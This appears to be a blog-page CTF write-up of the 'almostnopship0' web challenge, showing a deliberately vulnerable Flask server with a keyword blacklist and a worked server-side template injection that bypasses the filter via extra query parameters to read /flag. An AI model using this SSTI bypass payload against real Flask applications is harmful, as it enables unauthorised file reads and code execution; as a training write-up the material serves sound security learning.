@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. pew pew
+  We are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name.
+  Cool! Four P&amp;rsquo;s are better than three. Now Let&amp;rsquo;s take a look at that source code:" />
+<meta name="keywords" content=", osuleague, ctf, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/blog/almostnopship0/" />
+
+
+    <title>
+        
+            OSU League 2020/2021 - almostnopship0 Writeup :: Cameron McCawley 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="OSU League 2020/2021 - almostnopship0 Writeup">
+<meta itemprop="description" content="For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. pew pew
+  We are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name.
+  Cool! Four P&rsquo;s are better than three. Now Let&rsquo;s take a look at that source code:">
+<meta itemprop="datePublished" content="2021-02-07T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-02-07T00:00:00+00:00" />
+<meta itemprop="wordCount" content="477">
+<meta itemprop="image" content=""/>
+
+
+
+<meta itemprop="keywords" content="osuleague,ctf,security," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content=""/>
+
+<meta name="twitter:title" content="OSU League 2020/2021 - almostnopship0 Writeup"/>
+<meta name="twitter:description" content="For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. pew pew
+  We are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name.
+  Cool! Four P&rsquo;s are better than three. Now Let&rsquo;s take a look at that source code:"/>
+
+
+
+    <meta property="og:title" content="OSU League 2020/2021 - almostnopship0 Writeup" />
+<meta property="og:description" content="For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. pew pew
+  We are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name.
+  Cool! Four P&rsquo;s are better than three. Now Let&rsquo;s take a look at that source code:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog/almostnopship0/" />
+<meta property="og:image" content=""/>
+<meta property="article:published_time" content="2021-02-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-02-07T00:00:00+00:00" /><meta property="og:site_name" content="Cameron McCawley" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-02-07 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/cameronmccawley</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/blog/">Blog</a></li><li><a href="/resume.pdf">Resume</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="/blog/almostnopship0/">OSU League 2020/2021 - almostnopship0 Writeup</a></h2>
+
+            
+
+            <div class="post-content">
+                <p>For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. <del>pew pew</del></p>
+<figure>
+    <img src="/img/almost-1.png"/> 
+</figure>
+
+<p>We are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name.</p>
+<figure>
+    <img src="/img/almost-2.png"/> 
+</figure>
+
+<p>Cool! Four P&rsquo;s are better than three. Now Let&rsquo;s take a look at that source code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, request, send_file, render_template_string
+
+app <span style="color:#f92672">=</span> Flask(__name__)
+
+<span style="color:#75715e"># scary names!!</span>
+blacklist1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_[]</span><span style="color:#ae81ff">\&#39;\&#34;\\</span><span style="color:#e6db74">%&#39;</span>
+blacklist2 <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;mro&#39;</span>, <span style="color:#e6db74">&#39;config&#39;</span>, <span style="color:#e6db74">&#39;base&#39;</span>, <span style="color:#e6db74">&#39;join&#39;</span>, <span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">&#39;subprocess&#39;</span>]
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">root</span>():
+    name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>)
+
+    <span style="color:#66d9ef">if</span> name: 
+        name <span style="color:#f92672">=</span> name<span style="color:#f92672">.</span>lower()
+        <span style="color:#66d9ef">if</span> any([c <span style="color:#f92672">in</span> blacklist1 <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> name]) <span style="color:#f92672">or</span> any([b <span style="color:#f92672">in</span> name <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> blacklist2]):
+            name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stop it :(&#39;</span>
+
+    index <span style="color:#f92672">=</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, name<span style="color:#f92672">=</span>name)
+    <span style="color:#66d9ef">return</span> render_template_string(index)
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/src&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">src</span>():
+    <span style="color:#66d9ef">return</span> send_file(<span style="color:#e6db74">&#39;server.py&#39;</span>)
+
+<span style="color:#75715e"># todo run NOPs</span>
+</code></pre></div><p>Interesting. We can see that some sort of blacklist has been implemented that prevents us from using certain character.  Let&rsquo;s tests that out and see if it works:</p>
+<figure>
+    <img src="/img/almost-3.png"/> 
+</figure>
+
+<p>Yep, so our team name wasn&rsquo;t able to go through, what a bummer.<br>
+At this point I started to do some research on what I could possibly do to read the flag off of the server. I knew that it had to be a server side injecton, so I looked into that.  Eventually I came across what is know as a Flask SSTI, a type of server side template injection that Flask can be vulnerable to. I gave the input a simple template of <code>{{request.args}}</code> and voila.</p>
+<figure>
+    <img src="/img/almost-4.png"/> 
+</figure>
+
+<p>Now it&rsquo;s time to start crafting a payload.  We know that we can inject templates in the team name box, but those will all be checked against the blacklist. Maybe there is a way to add additional parameters that could then be read using <code>request.args</code>, that way the blacklisted items aren&rsquo;t actually part of <code>name</code>, but instead some other variable that we created.  Let&rsquo;s try it out:</p>
+<p><code>http://ctf-league.osusec.org:31311/?name={{request.args.param1}}&amp;param1=%%Scary_Name%%</code></p>
+<figure>
+    <img src="/img/almost-5.png"/> 
+</figure>
+
+<p>And there it is. We now have a way to bypass the filter.  Now we just need to figure out how we are going to get the flag. After doing some more research, we were able to find that we could use <code>request.application</code> to access python&rsquo;s internal built-in functions. We eventually settled on this for what we wanted to be excecuted on the server:</p>
+<p><code>request.application.__globals__.get(__builtins__).open(/flag)</code></p>
+<p>To transform this into a usable payload, however, we had to set it up in such a way so that we could get around the blacklist. We were able to eventually come up with a method to transform any command into a usable payload:</p>
+<pre><code>a.b = request.args.a|attr(request.args.b)
+a(b) = reqiest.args.a(request.args.b)
+</code></pre><p>With this we can start to seperate out our command into sections:</p>
+<pre><code>request.application + __globals__
+get() with paramater __builtins__
+open() with paramerter __flag__
+</code></pre><p>And putting the whole payload together:</p>
+<p><code>http://ctf-league.osusec.org:31311/?{{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}&amp;param1=__globals__&amp;param2=__builtins__&amp;param3=/flag</code></p>
+<p>We get the flag!</p>
+<figure>
+    <img src="/img/almost-flag.png"/> 
+</figure>
+
+<p><code>osu{but_mY_bLAcKL1st_W4S_so_g00d:(}</code></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  				<p>
+  					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="tags/osuleague">osuleague</a></span><span class="tag"><a href="tags/ctf">ctf</a></span><span class="tag"><a href="tags/security">security</a></span>
+  				</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+
+		
+    </body>
+</html>
